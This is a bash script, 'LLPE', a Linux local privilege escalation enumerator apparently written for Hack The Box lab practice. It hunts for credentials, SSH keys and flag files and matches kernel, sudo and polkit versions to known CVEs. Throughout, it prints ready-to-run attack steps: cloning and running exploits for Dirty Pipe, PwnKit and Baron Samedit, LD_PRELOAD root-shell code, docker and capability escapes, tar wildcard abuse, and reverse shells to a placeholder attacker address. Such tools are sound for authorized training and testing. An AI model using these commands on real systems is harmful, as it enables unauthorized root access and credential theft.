#!/bin/bash
# ============================================================
# LLPE - Linux Local Privilege Escalation Enumerator
# Based on HTB Academy Linux Privilege Escalation Module
# ============================================================

OUTPUT_FILE="llpe_output_$(hostname)_$(date +%Y%m%d_%H%M%S).txt"

# Colors for terminal
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Strip colors for file output
strip_colors() {
    sed 's/\x1b\[[0-9;]*m//g'
}

# Print to both terminal and file
log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_clean() {
    echo -e "$1" | tee -a <(strip_colors >> "$OUTPUT_FILE")
}

# Dual output — color to terminal, clean to file
print_both() {
    echo -e "$1"
    echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTPUT_FILE"
}

RED_FIND()    { print_both "${RED}${BOLD}[!!!] $1${NC}"; }
YELLOW_FIND() { print_both "${YELLOW}[??] $1${NC}"; }
GREEN_INFO()  { print_both "${GREEN}[+] $1${NC}"; }
SECTION()     { print_both "\n${CYAN}${BOLD}========================================${NC}"; 
                print_both "${CYAN}${BOLD}  SECTION: $1${NC}";
                print_both "${CYAN}${BOLD}========================================${NC}"; }
NEXT_STEPS()  { print_both "${YELLOW}${BOLD}  [NEXT STEPS] $1${NC}"; }
CMD_OUT()     { print_both "${NC}$1${NC}"; }

# ============================================================
# GTFOBins list (offline, from module)
# ============================================================
GTFOBINS="aa-exec ab apt apt-get ar aria2c arj arp ash aspell at awk base32 base64 bash bridge busybox bzip2 cat comm cp cpan cpio curl dash date dd diff dmsetup docker dpkg easy_install eb ed emacs env evil-job ex expand expect facter file find flock fmt fold gawk gdb gem git grep gtester gzip hd head hexdump highlight hping3 iconv install ip irb java jjs jq jrunscript knife ksh ksshell latex ldconfig less ltrace lua make man mawk more mosquitto_sub msgattrib msgcat msgconv msgfilter msgmerge msguniq mv mysql nano nasm nc nmap node nohup od openssl pdb perl pg php pic pip pixz pkg posh psql puppet python python3 readelf restic rev rlwrap rpm rsync ruby run-parts rview rvim scp screen sed service sftp sg shuf smbclient socat sort sqlite3 ssh start-stop-daemon stdbuf strace tail tar taskset tclsh tee telnet tftp time timeout tmate troff ul unexpand uniq unshare update-alternatives uudecode uuencode vagrant valgrind vi vim vim.basic vimdiff w3m watch wget whois xargs xxd xz yarn yum zip zsh"

# ============================================================
# KERNEL CVE VERSION MATRIX
# ============================================================
check_kernel_cves() {
    KVER=$(uname -r)
    KMAJ=$(echo $KVER | cut -d. -f1)
    KMIN=$(echo $KVER | cut -d. -f2)
    KPAT=$(echo $KVER | cut -d. -f3 | cut -d- -f1)

    KNUM="${KMAJ}.${KMIN}.${KPAT}"

    # Dirty Pipe CVE-2022-0847 — kernel 5.8 to 5.17
    if awk "BEGIN{exit !($KMAJ==5 && $KMIN>=8 && $KMIN<=17)}"; then
        RED_FIND "KERNEL CVE-2022-0847 (Dirty Pipe) — Kernel $KVER is in range 5.8-5.17"
        NEXT_STEPS "git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh && ./exploit-1 OR ./exploit-2 /usr/bin/sudo"
    fi

    # CVE-2021-22555 — kernel 2.6 to 5.11
    if awk "BEGIN{exit !(($KMAJ==2 && $KMIN==6) || ($KMAJ==3) || ($KMAJ==4) || ($KMAJ==5 && $KMIN<=11))}"; then
        RED_FIND "KERNEL CVE-2021-22555 (Netfilter) — Kernel $KVER is in range 2.6-5.11"
        NEXT_STEPS "wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c && gcc -m32 -static exploit.c -o exploit && ./exploit"
    fi

    # CVE-2022-25636 — kernel 5.4 to 5.6.10
    if awk "BEGIN{exit !($KMAJ==5 && ($KMIN==4 || $KMIN==5 || ($KMIN==6 && $KPAT<=10)))}"; then
        RED_FIND "KERNEL CVE-2022-25636 (Netfilter) — Kernel $KVER is in range 5.4-5.6.10"
        NEXT_STEPS "git clone https://github.com/Bonfee/CVE-2022-25636 && make && ./exploit -- WARNING: may corrupt kernel"
    fi

    # CVE-2023-32233 — kernel up to 6.3.1
    if awk "BEGIN{exit !(($KMAJ<6) || ($KMAJ==6 && $KMIN<3) || ($KMAJ==6 && $KMIN==3 && $KPAT<=1))}"; then
        RED_FIND "KERNEL CVE-2023-32233 (Netfilter UAF) — Kernel $KVER is <= 6.3.1"
        NEXT_STEPS "git clone https://github.com/Liuk3r/CVE-2023-32233 && gcc -Wall -o exploit exploit.c -lmnl -lnftnl && ./exploit"
    fi
}

# ============================================================
# PASSWORD PROMPT
# ============================================================
echo ""
print_both "${CYAN}${BOLD}[*] Enter your current user password for enhanced sudo checks${NC}"
print_both "${CYAN}    Press Enter to skip (passwordless sudo -l will still run)${NC}"
printf "Password: "
read -s USER_PASS
echo ""

if [ ! -z "$USER_PASS" ]; then
    print_both "${GREEN}[*] Password provided — sudo checks will use it${NC}"
else
    print_both "${YELLOW}[*] No password — running sudo -l without password only${NC}"
fi

# ============================================================
# START
# ============================================================
print_both "${CYAN}${BOLD}"
print_both "  ██╗     ██╗     ██████╗ ███████╗"
print_both "  ██║     ██║     ██╔══██╗██╔════╝"
print_both "  ██║     ██║     ██████╔╝█████╗  "
print_both "  ██║     ██║     ██╔═══╝ ██╔══╝  "
print_both "  ███████╗███████╗██║     ███████╗"
print_both "  ╚══════╝╚══════╝╚═╝     ╚══════╝"
print_both "  Linux Local Privilege Escalation Enumerator"
print_both "  Based on HTB Academy Linux PrivEsc Module${NC}"
print_both ""
print_both "${GREEN}[*] Output saving to: $OUTPUT_FILE${NC}"
print_both "${GREEN}[*] Started: $(date)${NC}"

# ============================================================
SECTION "1 - SYSTEM IDENTITY"
# ============================================================

WHOAMI=$(whoami)
USERID=$(id)
HOST=$(hostname)
KVER=$(uname -r)
KFULL=$(uname -a)

GREEN_INFO "Current user: $WHOAMI"
GREEN_INFO "Full ID: $USERID"
GREEN_INFO "Hostname: $HOST"
GREEN_INFO "Kernel: $KFULL"
print_both ""
print_both "$(cat /etc/os-release 2>/dev/null)"
print_both ""
print_both "$(cat /etc/lsb-release 2>/dev/null)"
print_both ""
print_both "$(lscpu 2>/dev/null | head -20)"
print_both ""
GREEN_INFO "Available shells:"
print_both "$(cat /etc/shells 2>/dev/null)"

# Check for tmux/screen in shells
if grep -q "tmux\|screen" /etc/shells 2>/dev/null; then
    YELLOW_FIND "tmux or screen is listed as a shell — check for hijackable sessions"
    NEXT_STEPS "ps aux | grep tmux — look for root tmux sessions with accessible sockets"
fi

# ============================================================
SECTION "2 - KERNEL CVE CHECK"
# ============================================================

GREEN_INFO "Kernel version: $(uname -r)"
check_kernel_cves

# ============================================================
SECTION "3 - ENVIRONMENT"
# ============================================================

print_both "PATH: $PATH"
print_both ""
print_both "$(env 2>/dev/null)"

# Check for . in PATH
if echo "$PATH" | grep -q "\.:" || echo "$PATH" | grep -qP "^\."; then
    RED_FIND "Current directory '.' found in PATH — PATH hijack possible"
    NEXT_STEPS "Create malicious binary with same name as a command called by root script/cron — place in . directory"
fi

# Check for writable directories in PATH
IFS=: read -ra PATHDIRS <<< "$PATH"
for dir in "${PATHDIRS[@]}"; do
    if [ -w "$dir" ] 2>/dev/null; then
        RED_FIND "Writable directory in PATH: $dir"
        NEXT_STEPS "Place malicious binary in $dir named after any command called without full path by root processes"
    fi
done

# Check env for credentials
if env 2>/dev/null | grep -iE "pass|pwd|secret|key|token|cred"; then
    RED_FIND "Potential credentials found in environment variables — see above"
fi

# ============================================================
SECTION "4 - USERS AND GROUPS"
# ============================================================

GREEN_INFO "Current user groups:"
print_both "$(id)"
print_both ""

# Check dangerous group memberships
for grp in docker lxd lxc disk adm sudo wheel; do
    if id | grep -q "$grp"; then
        RED_FIND "User is in $grp group"
        case $grp in
            docker)   NEXT_STEPS "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash — instant root" ;;
            lxd|lxc)  NEXT_STEPS "Import alpine image, create privileged container, mount / to /mnt/root — instant root" ;;
            disk)     NEXT_STEPS "debugfs /dev/sda1 — read entire filesystem as root" ;;
            adm)      NEXT_STEPS "Read all logs in /var/log — grep for passwords, tokens, creds" ;;
            sudo)     NEXT_STEPS "sudo -l — check what you can run, try sudo su" ;;
            wheel)    NEXT_STEPS "sudo -l — check what you can run, try sudo su" ;;
        esac
    fi
done

print_both ""
GREEN_INFO "All users with login shells:"
print_both "$(grep 'sh$' /etc/passwd)"
print_both ""
GREEN_INFO "All groups:"
print_both "$(cat /etc/group 2>/dev/null)"
print_both ""
GREEN_INFO "Home directories:"
print_both "$(ls /home 2>/dev/null)"
print_both ""
GREEN_INFO "Currently logged in users:"
print_both "$(w 2>/dev/null)"
print_both ""
GREEN_INFO "Last login times:"
print_both "$(lastlog 2>/dev/null | grep -v 'Never')"
print_both ""
GREEN_INFO "Bash histories found:"
find / -type f \( -name "*_hist" -o -name "*_history" -o -name ".bash_history" \) -exec ls -la {} \; 2>/dev/null | while read line; do
    YELLOW_FIND "History file: $line"
done

print_both ""
GREEN_INFO "SSH keys found:"
find / -path /snap -prune -o -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | while read keyfile; do
    if [ -r "$keyfile" ]; then
        RED_FIND "Readable SSH key: $keyfile"
        NEXT_STEPS "Use $keyfile to SSH as another user — also check known_hosts in same directory for targets"
    else
        YELLOW_FIND "SSH key exists but not readable: $keyfile"
    fi
done

print_both ""
GREEN_INFO "known_hosts files:"
find / -path /snap -prune -o -name "known_hosts" -print 2>/dev/null | while read kh; do
    YELLOW_FIND "known_hosts: $kh"
    print_both "$(cat $kh 2>/dev/null)"
done

# ============================================================
SECTION "5 - SUDO RIGHTS"
# ============================================================

GREEN_INFO "sudo -l output:"
if [ ! -z "$USER_PASS" ]; then
    SUDO_OUT=$(echo "$USER_PASS" | sudo -S -l 2>/dev/null)
else
    SUDO_OUT=$(sudo -ln 2>/dev/null)
fi
print_both "$SUDO_OUT"
print_both ""

# NOPASSWD ALL
if echo "$SUDO_OUT" | grep -q "NOPASSWD.*ALL\|ALL.*NOPASSWD"; then
    RED_FIND "NOPASSWD ALL — instant root"
    NEXT_STEPS "sudo su OR sudo /bin/bash"
fi

# NOPASSWD specific binary
if echo "$SUDO_OUT" | grep -q "NOPASSWD"; then
    YELLOW_FIND "NOPASSWD entry found — check binary against GTFOBins"
    SUDO_BINS=$(echo "$SUDO_OUT" | grep "NOPASSWD" | grep -oP '/\S+' | head -20)
    for bin in $SUDO_BINS; do
        BINNAME=$(basename "$bin")
        if echo "$GTFOBINS" | grep -qw "$BINNAME"; then
            RED_FIND "SUDO NOPASSWD binary $bin is on GTFOBins list"
            NEXT_STEPS "Check https://gtfobins.github.io/gtfobins/$BINNAME/#sudo for exact commands"
        fi
    done
fi

# LD_PRELOAD
if echo "$SUDO_OUT" | grep -q "LD_PRELOAD"; then
    RED_FIND "env_keep+=LD_PRELOAD found in sudo config"
    NEXT_STEPS "gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles && sudo LD_PRELOAD=/tmp/root.so <allowed_command>"
    print_both "    root.c contents: void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); }"
fi

# SETENV
if echo "$SUDO_OUT" | grep -q "SETENV"; then
    RED_FIND "SETENV flag in sudo entry — PYTHONPATH hijack may be possible"
    NEXT_STEPS "Create malicious python module in /tmp, run: sudo PYTHONPATH=/tmp/ /usr/bin/python3 <script>"
fi

# Binaries without absolute path
if echo "$SUDO_OUT" | grep -v "secure_path\|Defaults" | grep -qP '\s\w+\s' 2>/dev/null; then
    YELLOW_FIND "Possible sudo entry without absolute path — PATH abuse may apply"
fi

# Sudo version CVE check
SUDO_VER=$(sudo -V 2>/dev/null | head -1 | grep -oP '[\d.]+')
GREEN_INFO "Sudo version: $SUDO_VER"

SUDO_MAJ=$(echo $SUDO_VER | cut -d. -f1)
SUDO_MIN=$(echo $SUDO_VER | cut -d. -f2)
SUDO_PAT=$(echo $SUDO_VER | cut -d. -f3)

# CVE-2021-3156 Baron Samedit
if [ "$SUDO_MAJ" -eq 1 ] && [ "$SUDO_MIN" -eq 8 ] && [ "$SUDO_PAT" -le 31 ] 2>/dev/null; then
    RED_FIND "Sudo $SUDO_VER may be vulnerable to CVE-2021-3156 (Baron Samedit)"
    NEXT_STEPS "git clone https://github.com/blasty/CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich"
fi

# CVE-2019-14287
if [ "$SUDO_MAJ" -eq 1 ] && [ "$SUDO_MIN" -eq 8 ] && [ "$SUDO_PAT" -lt 28 ] 2>/dev/null; then
    RED_FIND "Sudo $SUDO_VER vulnerable to CVE-2019-14287 — sudo -u#-1 bypass"
    NEXT_STEPS "If any sudo entry exists: sudo -u#-1 <allowed_command>"
fi

# ============================================================
SECTION "6 - SUID AND SGID BINARIES"
# ============================================================

GREEN_INFO "SUID binaries:"
find / -path /snap -prune -o -user root -perm -4000 -print 2>/dev/null | xargs ls -ldb 2>/dev/null | while read line; do
    BINPATH=$(echo "$line" | awk '{print $NF}')
    BINNAME=$(basename "$BINPATH")
    if echo "$GTFOBINS" | grep -qw "$BINNAME"; then
        RED_FIND "SUID binary on GTFOBins: $line"
        NEXT_STEPS "Check https://gtfobins.github.io/gtfobins/$BINNAME/#suid"
    else
        YELLOW_FIND "SUID binary (not in GTFOBins list): $line"
    fi
done

print_both ""
GREEN_INFO "SGID binaries:"
find / -path /snap -prune -o -user root -perm -6000 -print 2>/dev/null | xargs ls -ldb 2>/dev/null | while read line; do
    BINPATH=$(echo "$line" | awk '{print $NF}')
    BINNAME=$(basename "$BINPATH")
    if echo "$GTFOBINS" | grep -qw "$BINNAME"; then
        RED_FIND "SGID binary on GTFOBins: $line"
        NEXT_STEPS "Check https://gtfobins.github.io/gtfobins/$BINNAME/#suid"
    else
        YELLOW_FIND "SGID binary: $line"
    fi
done

# Screen version check
SCREEN_VER=$(screen -v 2>/dev/null | grep -oP '[\d.]+' | head -1)
if [ ! -z "$SCREEN_VER" ]; then
    GREEN_INFO "Screen version: $SCREEN_VER"
    if echo "$SCREEN_VER" | grep -q "4.05\|4.5.0"; then
        RED_FIND "Screen $SCREEN_VER is vulnerable to local root exploit"
        NEXT_STEPS "Use screen_exploit.sh — exploits ld.so.preload via Screen SUID binary"
    fi
fi

# ============================================================
SECTION "7 - CAPABILITIES"
# ============================================================

GREEN_INFO "Capabilities on binaries:"
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -not -path "*/snap/*" -exec getcap {} \; 2>/dev/null | while read line; do
    BINPATH=$(echo "$line" | awk '{print $1}')
    BINNAME=$(basename "$BINPATH")
    CAPS=$(echo "$line" | awk '{print $2,$3}')

    if echo "$CAPS" | grep -qE "cap_setuid|cap_sys_admin|cap_dac_override"; then
        RED_FIND "Dangerous capability: $line"
        case $BINNAME in
            vim|vim.basic|vi|vimdiff)
                NEXT_STEPS "vim.basic -es '+%s/^root:[^:]*:/root::/' '+wq' /etc/passwd && su root"
                ;;
            python*)
                NEXT_STEPS "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                ;;
            perl)
                NEXT_STEPS "perl -e 'use POSIX (setuid); setuid(0); exec \"/bin/bash\";'"
                ;;
            *)
                NEXT_STEPS "Check GTFOBins for $BINNAME capability abuse"
                ;;
        esac
    else
        YELLOW_FIND "Capability set: $line"
    fi
done

# ============================================================
SECTION "8 - CRON JOBS"
# ============================================================

GREEN_INFO "User crontab:"
print_both "$(crontab -l 2>/dev/null)"
print_both ""
GREEN_INFO "System crontab:"
print_both "$(cat /etc/crontab 2>/dev/null)"
print_both ""
GREEN_INFO "Cron directories:"
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.d/ 2>/dev/null | while read line; do
    print_both "$line"
done

# Find world-writable cron scripts
print_both ""
GREEN_INFO "World-writable files (potential cron script targets):"
find / -path /proc -prune -o -path /snap -prune -o -type f -perm -o+w -print 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev\|^/snap" | while read wf; do
    YELLOW_FIND "World-writable file: $wf"
    if echo "$wf" | grep -qE "cron|backup|script|\.sh"; then
        RED_FIND "World-writable file looks like cron script: $wf"
        NEXT_STEPS "echo 'bash -i >& /dev/tcp/<YOUR_IP>/4443 0>&1' >> $wf && nc -lvnp 4443"
    fi
done

# Check for wildcard in cron
print_both ""
GREEN_INFO "Checking cron jobs for wildcard abuse:"
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null | grep "\*" | while read line; do
    if echo "$line" | grep -q "tar\|zip\|rsync"; then
        RED_FIND "Cron job with wildcard in archive command: $line"
        NEXT_STEPS "Wildcard abuse: echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh root.sh' && echo 'chmod u+s /bin/bash' > root.sh"
    fi
done

# ============================================================
SECTION "9 - WRITABLE DIRECTORIES AND FILES"
# ============================================================

GREEN_INFO "World-writable directories:"
find / -path /proc -prune -o -path /snap -prune -o -type d -perm -o+w -print 2>/dev/null | grep -v "^/proc\|^/sys\|^/dev\|^/tmp\|^/var/tmp\|^/run\|^/snap" | while read wd; do
    YELLOW_FIND "Writable directory: $wd"
done

print_both ""
GREEN_INFO "Shell scripts on system:"
find / -path /snap -prune -o -type f -name "*.sh" -print 2>/dev/null | grep -v "src\|share\|/proc\|/sys" | while read sh; do
    if [ -w "$sh" ]; then
        RED_FIND "Writable shell script: $sh"
        NEXT_STEPS "Check if this script runs as root via cron or sudo — append reverse shell if so"
    else
        YELLOW_FIND "Shell script: $sh"
    fi
done

# ============================================================
SECTION "10 - CREDENTIAL HUNTING"
# ============================================================

GREEN_INFO "Searching for passwords in config files:"
find / ! -path "*/proc/*" ! -path "*/snap/*" -iname "*config*" -type f 2>/dev/null | xargs grep -lE "password|passwd|pwd|secret|credential" 2>/dev/null | while read cf; do
    RED_FIND "Potential credentials in config file: $cf"
    grep -iE "password|passwd|pwd|secret|credential" "$cf" 2>/dev/null | head -5 | while read match; do
        YELLOW_FIND "  $match"
    done
    NEXT_STEPS "Review full file: cat $cf"
done

print_both ""
GREEN_INFO "WordPress config check:"
find / -path /snap -prune -o -name "wp-config.php" -print 2>/dev/null | while read wpcfg; do
    RED_FIND "WordPress config found: $wpcfg"
    grep 'DB_USER\|DB_PASSWORD\|DB_HOST' "$wpcfg" 2>/dev/null | while read line; do
        RED_FIND "  $line"
    done
    NEXT_STEPS "Try these DB credentials for mysql -u <user> -p or reuse against system users"
done

print_both ""
GREEN_INFO "Checking bash histories for credentials:"
find / -path /snap -prune -o -type f -name ".bash_history" -readable -print 2>/dev/null | while read bh; do
    YELLOW_FIND "Readable bash history: $bh"
    grep -iE "pass|ssh|sudo|mysql|ftp|wget|curl.*-u\|curl.*password" "$bh" 2>/dev/null | head -10 | while read line; do
        RED_FIND "  Interesting history entry: $line"
    done
done

print_both ""
GREEN_INFO "Mail directories:"
ls /var/mail/ /var/spool/mail/ 2>/dev/null | while read mf; do
    YELLOW_FIND "Mail file found: $mf"
done

print_both ""
GREEN_INFO "Hidden files in home directories:"
find /home /root -name ".*" -type f 2>/dev/null | while read hf; do
    YELLOW_FIND "Hidden file: $hf"
done

# ============================================================
SECTION "11 - INSTALLED PACKAGES AND SERVICES"
# ============================================================

GREEN_INFO "Installed packages (saving full list):"
apt list --installed 2>/dev/null | tee -a "$OUTPUT_FILE.pkgs" | wc -l | xargs -I{} echo "{} packages installed — full list in $OUTPUT_FILE.pkgs"

print_both ""
GREEN_INFO "Processes running as root:"
ps aux 2>/dev/null | grep "^root" | grep -v "\[" | while read line; do
    YELLOW_FIND "Root process: $line"
done

print_both ""
GREEN_INFO "Services with known CVEs — version check:"
# Nagios
nagios_ver=$(nagios --version 2>/dev/null | head -1)
[ ! -z "$nagios_ver" ] && YELLOW_FIND "Nagios found: $nagios_ver — check for CVE-2016-9566 (< 4.2.4)"

# Exim
exim_ver=$(exim --version 2>/dev/null | head -1)
[ ! -z "$exim_ver" ] && YELLOW_FIND "Exim found: $exim_ver — check for known Exim CVEs"

# ProFTPd
proftpd_ver=$(proftpd --version 2>/dev/null | head -1)
[ ! -z "$proftpd_ver" ] && YELLOW_FIND "ProFTPd found: $proftpd_ver"

# ============================================================
SECTION "12 - NETWORK AND FILESYSTEM"
# ============================================================

GREEN_INFO "Network interfaces:"
print_both "$(ip a 2>/dev/null)"
print_both ""

# Check for multiple interfaces — pivot potential
IFACE_COUNT=$(ip a 2>/dev/null | grep "^[0-9]" | grep -v "lo:" | wc -l)
if [ "$IFACE_COUNT" -gt 1 ]; then
    YELLOW_FIND "Multiple network interfaces detected — possible pivot host"
    NEXT_STEPS "Document all subnets — this host may be able to reach internal networks"
fi

GREEN_INFO "Routing table:"
print_both "$(route 2>/dev/null || ip route 2>/dev/null)"
print_both ""
GREEN_INFO "ARP cache (recently contacted hosts):"
print_both "$(arp -a 2>/dev/null)"
print_both ""
GREEN_INFO "Mounted filesystems:"
print_both "$(df -h 2>/dev/null)"
print_both ""
GREEN_INFO "fstab:"
print_both "$(cat /etc/fstab 2>/dev/null)"

# Check fstab for credentials
if grep -qiE "pass|user=" /etc/fstab 2>/dev/null; then
    RED_FIND "Potential credentials in /etc/fstab"
    grep -iE "pass|user=" /etc/fstab | while read line; do
        RED_FIND "  $line"
    done
fi

print_both ""
GREEN_INFO "Unmounted drives:"
print_both "$(lsblk 2>/dev/null)"
print_both ""

# NFS exports
GREEN_INFO "NFS exports:"
if [ -f /etc/exports ]; then
    print_both "$(cat /etc/exports)"
    if grep -q "no_root_squash" /etc/exports 2>/dev/null; then
        RED_FIND "NFS export with no_root_squash found"
        NEXT_STEPS "Compile SUID shell locally, sudo mount -t nfs <IP>:/share /mnt, cp shell /mnt, chmod u+s /mnt/shell, run on target"
    fi
fi

# ============================================================
SECTION "13 - CONTAINER AND VIRTUALIZATION DETECTION"
# ============================================================

# Docker container check
if [ -f /.dockerenv ]; then
    RED_FIND "Running inside a Docker container"
    NEXT_STEPS "Look for docker.sock, check mounted volumes, check for privileged mode: cat /proc/self/status | grep CapEff"
fi

if grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null; then
    RED_FIND "Container indicators found in /proc/1/cgroup"
    print_both "$(cat /proc/1/cgroup 2>/dev/null)"
fi

# Docker socket
DOCKER_SOCK=$(find / -name "docker.sock" 2>/dev/null | head -5)
if [ ! -z "$DOCKER_SOCK" ]; then
    RED_FIND "Docker socket found: $DOCKER_SOCK"
    if [ -w "$DOCKER_SOCK" ]; then
        RED_FIND "Docker socket is WRITABLE"
        NEXT_STEPS "docker -H unix://$DOCKER_SOCK run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
    fi
fi

# Kubernetes
if env | grep -qi "kube\|kubernetes" 2>/dev/null; then
    RED_FIND "Kubernetes environment variables detected"
    NEXT_STEPS "curl https://localhost:6443 -k && curl https://localhost:10250/pods -k — enumerate K8s API"
fi

if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    RED_FIND "Kubernetes service account token found"
    NEXT_STEPS "export token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && kubectl --token=\$token auth can-i --list"
fi

# ============================================================
SECTION "14 - POLKIT CHECK"
# ============================================================

POLKIT_VER=$(pkexec --version 2>/dev/null | grep -oP '[\d.]+')
if [ ! -z "$POLKIT_VER" ]; then
    GREEN_INFO "Polkit version: $POLKIT_VER"
    POLKIT_MAJ=$(echo $POLKIT_VER | cut -d. -f1)
    POLKIT_MIN=$(echo $POLKIT_VER | cut -d. -f2)
    POLKIT_PAT=$(echo $POLKIT_VER | cut -d. -f3)

    # CVE-2021-4034 PwnKit — affects virtually all polkit before Jan 2022 patch
    # Fixed in 0.105-26ubuntu3.1 / 0.105-33 etc depending on distro
    if [ "$POLKIT_MAJ" -eq 0 ] && [ "$POLKIT_MIN" -le 105 ] 2>/dev/null; then
        RED_FIND "Polkit $POLKIT_VER likely vulnerable to CVE-2021-4034 (PwnKit)"
        NEXT_STEPS "git clone https://github.com/arthepsy/CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc && ./poc"
    fi
fi

# ============================================================
SECTION "15 - PYTHON LIBRARY HIJACKING"
# ============================================================

GREEN_INFO "Python path search order:"
python3 -c 'import sys; print("\n".join(sys.path))' 2>/dev/null | while read pypath; do
    print_both "  $pypath"
    if [ ! -z "$pypath" ] && [ -w "$pypath" ] 2>/dev/null; then
        RED_FIND "Writable Python path directory: $pypath"
        NEXT_STEPS "Create malicious module in $pypath with same name as an imported module in any SUID/sudo Python script"
    fi
done

print_both ""
GREEN_INFO "SUID Python scripts:"
find / -path /snap -prune -o -perm -4000 -name "*.py" -print 2>/dev/null | while read pyscript; do
    RED_FIND "SUID Python script: $pyscript"
    NEXT_STEPS "Identify imports in $pyscript and hijack writable module"
done

print_both ""
GREEN_INFO "Python scripts in sudo entries:"
if echo "$SUDO_OUT" | grep -q "python"; then
    RED_FIND "Python in sudo entry — check for SETENV and library hijack"
    NEXT_STEPS "Check PYTHONPATH abuse: sudo PYTHONPATH=/tmp/ /usr/bin/python3 <script>"
fi

# ============================================================
SECTION "16 - SHARED OBJECT HIJACKING"
# ============================================================

GREEN_INFO "Checking SUID binaries for writable RUNPATH:"
find / -path /snap -prune -o -user root -perm -4000 -print 2>/dev/null | while read suid; do
    RUNPATH=$(readelf -d "$suid" 2>/dev/null | grep "RUNPATH\|RPATH" | grep -oP '\[.*?\]' | tr -d '[]')
    if [ ! -z "$RUNPATH" ]; then
        YELLOW_FIND "SUID binary $suid has RUNPATH: $RUNPATH"
        if [ -w "$RUNPATH" ] 2>/dev/null; then
            RED_FIND "RUNPATH $RUNPATH is WRITABLE for SUID binary $suid"
            NEEDED=$(ldd "$suid" 2>/dev/null | grep "not found\|$RUNPATH" | awk '{print $1}')
            RED_FIND "Required library: $NEEDED"
            NEXT_STEPS "Compile malicious .so with required function name and place in $RUNPATH — run $suid for root"
        fi
    fi
done

# ============================================================
SECTION "17 - LOGROTATE CHECK"
# ============================================================

LOGRORATE_VER=$(logrotate --version 2>/dev/null | head -1 | grep -oP '[\d.]+' | head -1)
if [ ! -z "$LOGRORATE_VER" ]; then
    GREEN_INFO "Logrotate version: $LOGRORATE_VER"
    for vulnver in "3.8.6" "3.11.0" "3.15.0" "3.18.0"; do
        if [ "$LOGRORATE_VER" = "$vulnver" ]; then
            RED_FIND "Logrotate $LOGRORATE_VER is vulnerable to logrotten exploit"
            NEXT_STEPS "git clone https://github.com/whotwagner/logrotten && gcc logrotten.c -o logrotten && echo 'bash -i >& /dev/tcp/<IP>/9001 0>&1' > payload && ./logrotten -p payload /path/to/writable.log"
        fi
    done
fi

print_both ""
GREEN_INFO "Logrotate config:"
grep "create\|compress" /etc/logrotate.conf 2>/dev/null | grep -v "#" | while read line; do
    YELLOW_FIND "Logrotate option: $line"
done

# ============================================================
SECTION "18 - TMUX SESSION HIJACKING"
# ============================================================

GREEN_INFO "Running tmux processes:"
TMUX_PROCS=$(ps aux 2>/dev/null | grep "tmux" | grep -v grep)
if [ ! -z "$TMUX_PROCS" ]; then
    YELLOW_FIND "tmux processes running:"
    echo "$TMUX_PROCS" | while read line; do
        print_both "  $line"
        if echo "$line" | grep -q "^root"; then
            RED_FIND "Root tmux process detected"
            SOCKET=$(echo "$line" | grep -oP '\-S \S+' | awk '{print $2}')
            if [ ! -z "$SOCKET" ] && [ -r "$SOCKET" ]; then
                RED_FIND "Tmux socket $SOCKET is readable"
                NEXT_STEPS "tmux -S $SOCKET — attach to root tmux session"
            fi
        fi
    done
fi

# ============================================================
SECTION "19 - INTERESTING FILES SUMMARY"
# ============================================================

GREEN_INFO "Config files:"
find / -path /snap -prune -o -type f \( -name "*.conf" -o -name "*.config" \) -print 2>/dev/null | grep -v "/proc\|/sys\|/usr/share/doc" | head -30 | while read cf; do
    YELLOW_FIND "$cf"
done

print_both ""
GREEN_INFO "Backup files:"
find / -path /snap -prune -o \( -name "*.bak" -o -name "*.backup" -o -name "*.old" \) -print 2>/dev/null | grep -v "/proc\|/sys" | while read bf; do
    YELLOW_FIND "Backup file: $bf"
done

print_both ""
GREEN_INFO "Temp directory contents:"
print_both "$(ls -la /tmp /var/tmp /dev/shm 2>/dev/null)"

print_both ""
GREEN_INFO "Recently modified files (last 10 mins):"
find / -path /proc -prune -o -path /sys -prune -o -type f -newer /tmp -print 2>/dev/null | grep -v "^/proc\|^/sys" | head -20 | while read rf; do
    YELLOW_FIND "Recently modified: $rf"
done

# ============================================================
SECTION "19b - HTB FLAG HUNTING"
# ============================================================

GREEN_INFO "Searching for flag files by name:"
find / -path /snap -prune -o -path /proc -prune -o -path /sys -prune -o \
    \( -iname "flag*.txt" -o -iname "flag*.php" -o -iname "user.txt" -o -iname "root.txt" \) \
    -print 2>/dev/null | while read flagfile; do
    RED_FIND "Flag file found: $flagfile"
    if [ -r "$flagfile" ]; then
        print_both "$(cat $flagfile 2>/dev/null)"
    fi
done

print_both ""
GREEN_INFO "Searching file contents for HTB flag format HTB{...}:"
grep -rP "HTB\{.*?\}" / --include="*.txt" 2>/dev/null | while read match; do
    RED_FIND "HTB flag in txt file: $match"
done

print_both ""
GREEN_INFO "Searching file contents for LLPE flag format LLPE{...}:"
grep -rP "LLPE\{.*?\}" / --include="*.txt" 2>/dev/null | while read match; do
    RED_FIND "LLPE flag in txt file: $match"
done


# ============================================================
SECTION "20 - FINAL SUMMARY"
# ============================================================

print_both ""
print_both "${RED}${BOLD}=== HIGH CONFIDENCE FINDINGS (RED) ===${NC}"
grep "\[!!!\]" "$OUTPUT_FILE" | while read line; do
    print_both "${RED}$line${NC}"
done

print_both ""
